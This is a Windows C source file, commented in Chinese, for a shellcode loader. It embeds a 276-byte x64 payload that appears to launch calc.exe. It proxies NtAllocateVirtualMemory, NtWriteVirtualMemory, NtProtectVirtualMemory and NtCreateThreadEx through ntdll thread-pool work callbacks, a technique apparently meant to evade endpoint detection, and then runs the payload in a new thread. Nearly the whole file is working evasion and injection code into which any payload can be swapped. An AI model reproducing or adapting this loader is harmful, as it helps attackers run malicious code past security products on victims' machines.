#include <windows.h>
#include <stdio.h>


unsigned char ShellCode[276] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
	0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52,
	0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED,
	0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88,
	0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48,
	0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1,
	0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49,
	0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A,
	0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B,
	0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47,
	0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x2E,
	0x65, 0x78, 0x65, 0x00
};

//unsigned char ShellCode[276] = {0xCC};

//回调函数的声明
typedef NTSTATUS(NTAPI* TPALLOCWORK)(PTP_WORK* ptpWrk, PTP_WORK_CALLBACK pfnwkCallback, PVOID OptionalArg, PTP_CALLBACK_ENVIRON CallbackEnvironment);
typedef VOID(NTAPI* TPPOSTWORK)(PTP_WORK);
typedef VOID(NTAPI* TPRELEASEWORK)(PTP_WORK);

/// <summary>
/// 参数结构体
/// </summary>
typedef struct _NTALLOCATEVIRTUALMEMORY_ARGS {
	UINT_PTR pNtAllocateVirtualMemory;   // pointer to NtAllocateVirtualMemory - rax
	HANDLE hProcess;                     // HANDLE ProcessHandle - rcx
	PVOID* address;                      // PVOID *BaseAddress - rdx; ULONG_PTR ZeroBits - 0 - r8
	PSIZE_T size;                        // PSIZE_T RegionSize - r9; ULONG AllocationType - MEM_RESERVE|MEM_COMMIT = 3000 - stack pointer
	ULONG permissions;                   // ULONG Protect - PAGE_EXECUTE_READ - 0x20 - stack pointer
} NTALLOCATEVIRTUALMEMORY_ARGS, * PNTALLOCATEVIRTUALMEMORY_ARGS;

typedef struct _NTALLOCATEVIRTUALMEMORY_CreateThread
{
	UINT_PTR pNtCreateThreadEx;   // pointer to NtCreateThreadex - rax
	PHANDLE ThreadHandle;
	DWORD DesiredAccess;
	HANDLE ProcessHandle;
	PVOID StartRoutine;
}NTALLOCATEVIRTUALMEMORY_CreateThread, * PNTALLOCATEVIRTUALMEMORY_CreateThread;

typedef struct _NTALLOCATEVIRTUALMEMORY_NtWriteVirtualMemory
{
	UINT_PTR pNtWriteVirtualMemory;   // pointer to NtWriteVirtualMemory - rax
	HANDLE ProcessHandle;
	PVOID BaseAddress;
	PVOID Buffer;
	SIZE_T NumberOfBytesToWrite;
	PSIZE_T NumberOfBytesWritten;
}NTALLOCATEVIRTUALMEMORY_NtWriteVirtualMemory, * PNTALLOCATEVIRTUALMEMORY_NtWriteVirtualMemory;


typedef struct _NTALLOCATEVIRTUALMEMORY_NtProtectVirtualMemory
{
	UINT_PTR pNtProtectVirtualMemory;   // pointer to NtWriteVirtualMemory - rax
	HANDLE ProcessHandle;
	PVOID* BaseAddress;
	PSIZE_T RegionSize;
	ULONG NewProtect;
	PULONG OldProtect;
}NTALLOCATEVIRTUALMEMORY_NtProtectVirtualMemory, * PNTALLOCATEVIRTUALMEMORY_NtProtectVirtualMemory;



EXTERN_C VOID WorkCallback(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);

EXTERN_C VOID WorkCallCreateThread(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);

EXTERN_C VOID WorkCallNtWriteVirtualMemory(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);

EXTERN_C VOID WorkCallNtProtectVirtualMemory(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);


int main() {
	LPVOID allocatedAddress = NULL;
	SIZE_T allocatedsize = 0x1000;
	SIZE_T outBufferSize = 0;
	HANDLE handle = (HANDLE)-1;
	ULONG OldProtect;

	//从ntdll 那函数地址
	FARPROC pTpAllocWork = GetProcAddress(GetModuleHandleA("ntdll"), "TpAllocWork");
	FARPROC pTpPostWork = GetProcAddress(GetModuleHandleA("ntdll"), "TpPostWork");
	FARPROC pTpReleaseWork = GetProcAddress(GetModuleHandleA("ntdll"), "TpReleaseWork");

	//ntAllocateVirtualMemory调用 申请RW权限内存
	// 初始化函数 参数结构体
	NTALLOCATEVIRTUALMEMORY_ARGS ntAllocateVirtualMemoryArgs = { 0 };
	ntAllocateVirtualMemoryArgs.pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddress(GetModuleHandleA("ntdll"), "NtAllocateVirtualMemory");
	ntAllocateVirtualMemoryArgs.hProcess = (HANDLE)-1;
	ntAllocateVirtualMemoryArgs.address = &allocatedAddress;
	ntAllocateVirtualMemoryArgs.size = &allocatedsize;
	//ntAllocateVirtualMemoryArgs.permissions = PAGE_EXECUTE_READWRITE;
	ntAllocateVirtualMemoryArgs.permissions = PAGE_READWRITE;

	// 调用函数
	PTP_WORK WorkReturn = NULL;
	((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)WorkCallback, &ntAllocateVirtualMemoryArgs, NULL);
	((TPPOSTWORK)pTpPostWork)(WorkReturn);
	((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);
	WaitForSingleObject((HANDLE)-1, 0x1000);
	printf("allocatedAddress: %p alloc\n", allocatedAddress);


	//NtWriteVirtualMemory调用
	NTALLOCATEVIRTUALMEMORY_NtWriteVirtualMemory  NtWriteVirtualMemoryArgs = { 0 };
	NtWriteVirtualMemoryArgs.pNtWriteVirtualMemory = (UINT_PTR)GetProcAddress(GetModuleHandleA("ntdll"), "NtWriteVirtualMemory");
	NtWriteVirtualMemoryArgs.ProcessHandle = (HANDLE)-1;
	NtWriteVirtualMemoryArgs.BaseAddress = allocatedAddress;
	NtWriteVirtualMemoryArgs.Buffer = ShellCode;
	NtWriteVirtualMemoryArgs.NumberOfBytesToWrite = sizeof(ShellCode);
	NtWriteVirtualMemoryArgs.NumberOfBytesWritten = &outBufferSize;

	// 调用函数
	((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)WorkCallNtWriteVirtualMemory, &NtWriteVirtualMemoryArgs, NULL);
	((TPPOSTWORK)pTpPostWork)(WorkReturn);
	((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);
	WaitForSingleObject((HANDLE)-1, 0x1000);
	printf("allocatedAddress:  %p  write\n", allocatedAddress);
	

	// NtProtectVirtualMemory 调用 更改内存为RX权限
	NTALLOCATEVIRTUALMEMORY_NtProtectVirtualMemory NtProtectVirtualMemoryArgs = { 0 };
	NtProtectVirtualMemoryArgs.pNtProtectVirtualMemory = (UINT_PTR)GetProcAddress(GetModuleHandleA("ntdll"), "NtProtectVirtualMemory");
	NtProtectVirtualMemoryArgs.ProcessHandle = (HANDLE)-1;
	NtProtectVirtualMemoryArgs.BaseAddress = &allocatedAddress;
	NtProtectVirtualMemoryArgs.RegionSize = &allocatedsize;
	NtProtectVirtualMemoryArgs.NewProtect = PAGE_EXECUTE_READ;
	NtProtectVirtualMemoryArgs.OldProtect = &OldProtect;

	// 调用函数
	((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)WorkCallNtProtectVirtualMemory, &NtProtectVirtualMemoryArgs, NULL);
	((TPPOSTWORK)pTpPostWork)(WorkReturn);
	((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);
	WaitForSingleObject((HANDLE)-1, 0x1000);
	printf("allocatedAddress:  %p  Protect\n", allocatedAddress);



	//NtCreateThreadEx 调用
	// 初始化函数 参数结构体
	NTALLOCATEVIRTUALMEMORY_CreateThread NtCreateThreadExArgs = { 0 };
	NtCreateThreadExArgs.pNtCreateThreadEx = (UINT_PTR)GetProcAddress(GetModuleHandleA("ntdll"), "NtCreateThreadEx");
	NtCreateThreadExArgs.ThreadHandle = (PHANDLE)&handle;
	NtCreateThreadExArgs.DesiredAccess = 0x1FFFFF;
	NtCreateThreadExArgs.ProcessHandle = GetCurrentProcess();
	NtCreateThreadExArgs.StartRoutine = allocatedAddress;

	//memcpy(allocatedAddress, ShellCode, sizeof(ShellCode));
	
	// 调用函数
	((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)WorkCallCreateThread, &NtCreateThreadExArgs, NULL);
	((TPPOSTWORK)pTpPostWork)(WorkReturn);
	((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);

	WaitForSingleObject((HANDLE)-1, 0x1000);
	
	printf("allocatedAddress:  %p  createThread\n", allocatedAddress);
	getchar();

	return 0;
}